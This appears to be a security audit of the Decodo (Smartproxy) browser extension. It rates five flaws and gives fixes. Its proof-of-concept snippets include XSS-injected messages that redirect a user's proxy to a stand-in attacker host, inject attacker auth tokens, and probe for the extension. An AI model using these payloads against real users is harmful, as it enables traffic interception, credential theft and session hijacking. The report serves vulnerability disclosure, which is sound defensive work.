# Vulnerability Report: Decodo (Smartproxy) Extension

**Extension ID:** `hdemabfejemmmicoabglpocdmmkjphpo`
**Version:** 8.10.0
**Author:** tech@decodo.com
**Framework:** Plasmo (Parcel bundler)
**Manifest:** V3
**Triage flags:** V1=6, V2=7 -- innerhtml_dynamic, postmessage_no_origin, dynamic_tab_url, dynamic_window_open, webrequest_all_urls

---

## Permissions Analysis

| Permission | Risk | Purpose |
|---|---|---|
| `storage` | Low | Store auth tokens, settings |
| `proxy` | **High** | Full proxy configuration control |
| `webRequest` | **High** | Intercept all network requests |
| `webRequestAuthProvider` | Medium | Provide proxy auth credentials |
| `browsingData` | Medium | Clear cookies for proxy origins |
| `tabs` | Medium | Create tabs, query active tab |
| `privacy` | **High** | Control WebRTC IP handling policy |
| `<all_urls>` (host_permissions) | **High** | Access all URLs |
| `externally_connectable` | Medium | `dashboard.decodo.com/*`, `dashboard.decodo.cn/*`, `ip.decodo.com/json` |

---

## Vulnerability 1: External Message Proxy Configuration Without Sender Validation

| Attribute | Value |
|---|---|
| **CVSS 3.1 Score** | **7.4 (High)** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
| **Affected File** | `static/background/index.js:353-374` (onMessageExternal handler) and `static/background/index.js:689-721` (connection handler) |

### Description

The extension registers a `chrome.runtime.onMessageExternal` listener (line 353) that accepts `"connection"` messages from externally connectable pages and forwards them to the connection handler (line 689). The connection handler directly destructures `req.body` to extract `domain`, `port`, and `protocol` values and passes them to `setChromeProxy()` or `setFirefoxProxy()` without any validation of the values.

While Chrome's `externally_connectable` mechanism restricts which origins can send external messages (only `dashboard.decodo.com/*`, `dashboard.decodo.cn/*`, and `ip.decodo.com/json`), the handler itself performs **zero validation** on the proxy configuration parameters received. If the dashboard site is compromised (XSS, subdomain takeover, supply chain attack), an attacker can reconfigure the user's proxy to point to an attacker-controlled server.

```javascript
// static/background/index.js:689-706
const handler = async (req, res)=>{
    const { domain, port, protocol, isWhitelistedIp, browser: browser1, type, shouldDisableWebRTC } = req.body;
    // NO validation of domain, port, or protocol
    browser1 === "chrome" ? await setChromeProxy({
        domain,  // Attacker-controlled
        port,    // Attacker-controlled
        protocol // Attacker-controlled
    }) : setFirefoxProxy({ domain, port, protocol });
};
```

### Proof of Concept

If an attacker achieves XSS on `dashboard.decodo.com`:

```javascript
// Injected on dashboard.decodo.com via XSS
chrome.runtime.sendMessage(
  "hdemabfejemmmicoabglpocdmmkjphpo",
  {
    name: "connection",
    body: {
      domain: "evil-proxy.attacker.com",
      port: 8080,
      protocol: "http",
      isWhitelistedIp: true,  // Skip auth listener
      browser: "chrome",
      type: "connect",
      shouldDisableWebRTC: false
    }
  }
);
```

### Impact

- **Traffic interception**: All browser traffic routes through attacker-controlled proxy, enabling full MITM for non-HTTPS sites and metadata collection for HTTPS
- **Credential theft**: Proxy auth credentials stored via `authStorage` are automatically sent to whatever proxy server is configured (via `onAuthRequired` listener at line 669-676)
- **No user indication**: The extension sets the proxy silently; the user sees no warning beyond the existing extension icon

---

## Vulnerability 2: External Message Token Injection Without Sender Validation

| Attribute | Value |
|---|---|
| **CVSS 3.1 Score** | **7.1 (High)** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:N` |
| **Affected File** | `static/background/index.js:741-758` (listener function) and `static/background/index.js:795` (onMessageExternal registration) |

### Description

The `listener` function (line 741) is registered on both `runtime.onMessage` (internal) and `runtime.onMessageExternal` (external) at lines 793-795. On Chrome, this listener directly destructures `token`, `refreshToken`, and `userUUID` from the incoming request without any validation and stores them in both the Redux store and `chrome.storage.local`.

```javascript
// static/background/index.js:741-758
const listener = (request, _sender, sendResponse)=>{
    // On Chrome: directly uses request properties
    const { token, refreshToken, userUUID } = (0, _constants.isFirefox) ? getDecryptedValues(request) : request;
    if (token) {
        store.dispatch(setToken(token));
        store.dispatch(setRefreshToken(refreshToken));
        store.dispatch(setUserUUID(userUUID));
        // Stores in chrome.storage.local
        BROWSER.storage.local.set({
            token: token,
            refresh_token: refreshToken,
            user_uuid: userUUID
        });
    }
};
// Line 795: registered on external messages too
BROWSER.runtime.onMessageExternal.addListener(listener);
```

This is a separate handler from the Plasmo messaging framework handler on line 353. It processes raw token values directly.

### Proof of Concept

```javascript
// Injected on dashboard.decodo.com via XSS
chrome.runtime.sendMessage(
  "hdemabfejemmmicoabglpocdmmkjphpo",
  {
    token: "attacker-controlled-jwt-token",
    refreshToken: "attacker-refresh-token",
    userUUID: "attacker-uuid"
  }
);
```

### Impact

- **Session hijacking**: Attacker can inject their own auth tokens, binding the extension to an attacker-controlled Decodo/Smartproxy account
- **Account takeover of extension session**: The extension will make subsequent API calls using the attacker's credentials, potentially routing traffic through attacker-controlled proxy infrastructure
- **Combined with Vuln 1**: Token injection + proxy reconfiguration = complete traffic takeover

---

## Vulnerability 3: Login URL Uses Plaintext HTTP

| Attribute | Value |
|---|---|
| **CVSS 3.1 Score** | **5.3 (Medium)** |
| **Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` |
| **Affected File** | `static/background/index.js:459` |

### Description

The `LINKS.LOGIN` constant is hardcoded to use plaintext HTTP:

```javascript
// static/background/index.js:459
LOGIN: "http://dashboard.decodo.com/login?page=apps/extension/login",
```

All other dashboard links use HTTPS. This login URL is used when the user clicks the login button in the extension popup. The initial request to the login page is sent over unencrypted HTTP, making it vulnerable to network-level interception.

While the server likely redirects to HTTPS, the initial HTTP request exposes the URL path and query parameters, and a network-level attacker (e.g., on public WiFi, or if the user's own proxy is compromised per Vuln 1) could intercept the redirect and serve a phishing page.

### Proof of Concept

1. User connects to public WiFi or attacker-controlled network
2. User clicks "Login" in the Decodo extension
3. Extension opens `http://dashboard.decodo.com/login?page=apps/extension/login`
4. Attacker intercepts the plaintext HTTP request
5. Attacker serves a phishing page mimicking the Decodo login
6. User enters credentials on the phishing page

### Impact

- **Credential exposure**: Login page URL and potential auth redirect tokens visible in plaintext
- **Phishing facilitation**: Network attacker can redirect to fake login page
- **Chained impact**: If combined with Vuln 1 (proxy reconfiguration), the attacker controls the proxy AND the login flow

---

## Vulnerability 4: Leftover HMR Development Infrastructure in Production

| Attribute | Value |
|---|---|
| **CVSS 3.1 Score** | **3.7 (Low)** |
| **Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N` |
| **Affected File** | `manifest.json` (web_accessible_resources), `static/background/index.js:216-231`, `ff_login.bd1b0a65.js:212-229` |

### Description

The production build contains Plasmo's Hot Module Replacement (HMR) infrastructure:

1. **`manifest.json`** declares `__plasmo_hmr_proxy__` as a web-accessible resource matching `<all_urls>`
2. **`static/background/index.js:216-231`** registers a service worker `fetch` event listener that proxies requests through `__plasmo_hmr_proxy__`:

```javascript
// static/background/index.js:216-231
if (c.runtime.getManifest().manifest_version === 3) {
    let e = c.runtime.getURL("/__plasmo_hmr_proxy__?url=");
    globalThis.addEventListener("fetch", function(t) {
        let o = t.request.url;
        if (o.startsWith(e)) {
            let s = new URL(decodeURIComponent(o.slice(e.length)));
            s.hostname === n.host && s.port === `${n.port}` ?
                // Fetches arbitrary URL if hostname/port match
                t.respondWith(fetch(s).then(...)) :
                t.respondWith(new Response("Plasmo HMR", {status: 200}));
        }
    });
}
```

3. **`ff_login.bd1b0a65.js`** contains the content script HMR runtime that attempts WebSocket connections to `localhost:1815` and injects a loading UI overlay via innerHTML.

In production, the HMR host is `localhost` and port is hardcoded (1815 for content script, dynamic for background), so the fetch proxy only responds to localhost requests. The hostname/port check (line 222) prevents arbitrary URL fetching. However, the web-accessible resource declaration (`__plasmo_hmr_proxy__`) exposes the extension's internal URL scheme to all web pages, and the WebSocket connection attempts to localhost represent unnecessary attack surface.

### Proof of Concept

```javascript
// Any web page can probe the extension's presence via the web-accessible resource
fetch(
  `chrome-extension://hdemabfejemmmicoabglpocdmmkjphpo/__plasmo_hmr_proxy__?url=` +
  encodeURIComponent("http://localhost:1815/test")
).then(r => console.log("Extension detected"));
```

### Impact

- **Extension fingerprinting**: Any website can detect whether the Decodo extension is installed by probing the web-accessible resource
- **Information disclosure**: Leaks extension internal configuration (development host/port) in content script source
- **Expanded attack surface**: If a local service runs on the expected port, the proxy could be used to interact with it from web content

---

## Vulnerability 5: Content Script innerHTML with TrustedTypes Bypass Fallback

| Attribute | Value |
|---|---|
| **CVSS 3.1 Score** | **3.1 (Low)** |
| **Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N` |
| **Affected File** | `ff_login.bd1b0a65.js:230-291` |

### Description

The Plasmo HMR content script runtime creates a loading indicator div and sets its innerHTML with static SVG content. While the content itself is hardcoded (not user-controlled), the implementation falls back to raw innerHTML assignment when TrustedTypes is unavailable:

```javascript
// ff_login.bd1b0a65.js:230-291
var T = typeof trustedTypes < "u" ? trustedTypes.createPolicy(`trusted-html-${n}`, {
    createHTML: (e)=>e  // Pass-through policy - does not sanitize
}) : void 0;

// ... later:
e.innerHTML = T ? T.createHTML(t) : t;  // Falls back to raw innerHTML
```

The TrustedTypes policy itself is a pass-through (`createHTML: (e)=>e`), providing no actual sanitization. Since the HTML content is hardcoded static SVG, this is low risk in practice, but it establishes a dangerous pattern where the TrustedTypes policy could be reused by other code to bypass CSP TrustedTypes enforcement.

### Impact

- **Low practical risk**: The injected content is static/hardcoded SVG, not user-controlled
- **Pattern concern**: The pass-through TrustedTypes policy named `trusted-html-__plasmo-loading__` could potentially be reused to bypass TrustedTypes enforcement in other contexts
- **This is primarily a Plasmo framework concern**, not specific to the Decodo extension

---

## False Positive Analysis

The following triage flags were investigated and found to be non-issues:

| Flag | Finding | Verdict |
|---|---|---|
| `innerhtml_dynamic` | Plasmo HMR loading indicator uses innerHTML with static SVG content (ff_login.bd1b0a65.js:291). React's `dangerouslySetInnerHTML` references are React DOM internals, not application code. SVG namespace innerHTML in popup.a62a8de5.js:806-808 is standard React DOM reconciliation. | **FALSE POSITIVE** (framework code) |
| `dynamic_tab_url` | `chrome.tabs.create` only opens `tabs/reminder.html` via `runtime.getURL()` (static extension page). No dynamic/external URLs passed. | **FALSE POSITIVE** |
| `dynamic_window_open` | `window.open` calls use hardcoded Decodo dashboard/pricing URLs with `noopener,noreferrer`. No dynamic URL construction. | **FALSE POSITIVE** |

---

## Summary

| # | Vulnerability | CVSS | Severity |
|---|---|---|---|
| 1 | External Message Proxy Configuration Without Sender Validation | 7.4 | High |
| 2 | External Message Token Injection Without Sender Validation | 7.1 | High |
| 3 | Login URL Uses Plaintext HTTP | 5.3 | Medium |
| 4 | Leftover HMR Development Infrastructure in Production | 3.7 | Low |
| 5 | Content Script innerHTML with TrustedTypes Bypass Fallback | 3.1 | Low |

### Overall Risk Assessment: **MEDIUM-HIGH**

The primary concern is the combination of Vulnerabilities 1 and 2. While both are gated behind Chrome's `externally_connectable` restriction (only `dashboard.decodo.com/*`, `dashboard.decodo.cn/*`, and `ip.decodo.com/json` can send messages), the handlers perform no additional validation. An XSS vulnerability on the Decodo dashboard would allow an attacker to:

1. Inject attacker-controlled authentication tokens (Vuln 2)
2. Reconfigure the browser's proxy to point to an attacker-controlled server (Vuln 1)
3. Intercept all non-HTTPS traffic and collect metadata on HTTPS traffic
4. Steal proxy authentication credentials via the `onAuthRequired` listener

The `externally_connectable` restriction to the dashboard domains provides a meaningful defense layer, but defense-in-depth requires the extension to validate the data it receives regardless of the source origin.

### Recommendations

1. **Validate proxy configuration parameters**: Whitelist allowed proxy domains (e.g., only `*.decodo.com` / `*.smartproxy.com`), validate port ranges, and restrict protocols to expected values
2. **Validate token format**: Check JWT structure/signature before storing tokens from external messages
3. **Fix LOGIN URL**: Change `http://` to `https://` for the dashboard login link
4. **Remove HMR infrastructure**: Strip Plasmo development runtime code from production builds
5. **Use meaningful TrustedTypes policies**: Replace the pass-through `createHTML` with actual sanitization
